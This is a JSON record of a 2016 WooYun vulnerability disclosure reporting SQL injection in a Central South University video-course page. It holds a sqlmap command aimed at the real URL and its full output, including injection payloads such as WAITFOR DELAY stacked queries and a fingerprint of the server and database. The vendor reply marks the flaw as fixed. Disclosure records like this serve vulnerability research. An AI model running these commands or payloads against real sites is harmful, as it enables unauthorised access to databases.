{"id": 74658, "wybug_id": "wooyun-2016-0174085", "wybug_title": "中南大学某页面存在SQL注射", "wybug_corp": "中南大学", "wybug_author": "linkey", "wybug_date": "2016-02-01 10:58", "wybug_open_date": "2016-02-26 15:25", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "4", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-02-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-02-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-26：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： RT 详细说明：  \nsqlmap.py -u \"http://netclass.csu.edu.cn/Video/video/video.aspx?CoursewareID=17\" --table\n得出：\n[21:36:11] [INFO] testing connection to the target url[21:36:12] [INFO] testing if the url is stable, wait a few seconds[21:36:14] [WARNING] url is not stable, sqlmap will base the page comparison ona sequence matcher. If no dynamic nor injectable parameters are detected, or incase of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match onhow do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] c[21:36:17] [INFO] testing if GET parameter 'CoursewareID' is dynamic[21:36:17] [INFO] confirming that GET parameter 'CoursewareID' is dynamic[21:36:18] [INFO] GET parameter 'CoursewareID' is dynamic[21:36:18] [WARNING] heuristic test shows that GET parameter 'CoursewareID' might not be injectable[21:36:18] [INFO] testing for SQL injection on GET parameter 'CoursewareID'[21:36:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[21:36:20] [WARNING] reflective value(s) found and filtering out[21:36:21] [INFO] GET parameter 'CoursewareID' is 'AND boolean-based blind - WHERE or HAVING clause' injectable[21:36:21] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[21:36:22] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[21:36:22] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[21:36:22] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[21:36:22] [INFO] testing 'MySQL > 5.0.11 stacked queries'[21:36:23] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[21:36:23] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[21:36:44] [INFO] GET parameter 'CoursewareID' is 'Microsoft SQL Server/Sybase stacked queries' injectable[21:36:44] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[21:36:45] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[21:36:48] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[21:37:09] [INFO] GET parameter 'CoursewareID' is 'Microsoft SQL Server/Sybase time-based blind' injectable[21:37:09] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'[21:37:09] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other potential injection technique found[21:37:15] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[21:37:16] [INFO] ORDER BY technique seems to be usable. This should reduce thetime needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test[21:37:17] [INFO] target url appears to have 19 columns in querysqlmap got a 302 redirect to 'http://netclass.csu.edu.cn:80/Video/default.aspx'. Do you want to follow? [Y/n] ninjection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y[21:37:49] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. --dbms=mysql)GET parameter 'CoursewareID' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection points with a total of 126 HTTP(s) requests:\n结果:\nsqlmap identified the following injection points with a total of 126 HTTP(s) reuests:---Place: GETParameter: CoursewareID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: CoursewareID=17' AND 6739=6739 AND 'LgUR'='LgUR    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: CoursewareID=17'; WAITFOR DELAY '0:0:5';--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: CoursewareID=17' WAITFOR DELAY '0:0:5'-----[21:37:52] [INFO] testing MySQL[21:37:53] [WARNING] the back-end DBMS is not MySQL[21:37:53] [INFO] testing Oracle[21:37:53] [WARNING] the back-end DBMS is not Oracle[21:37:53] [INFO] testing PostgreSQL[21:37:53] [WARNING] the back-end DBMS is not PostgreSQL[21:37:53] [INFO] testing Microsoft SQL Server[21:37:54] [INFO] confirming Microsoft SQL Server[21:37:55] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows Vistaweb application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2005\n   漏洞证明：  \n\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 linkey@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2016-02-05 16:13 厂商回复： 网站已不再使用，拟从互联网撤除 最新状态： 2016-02-26：已修复  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}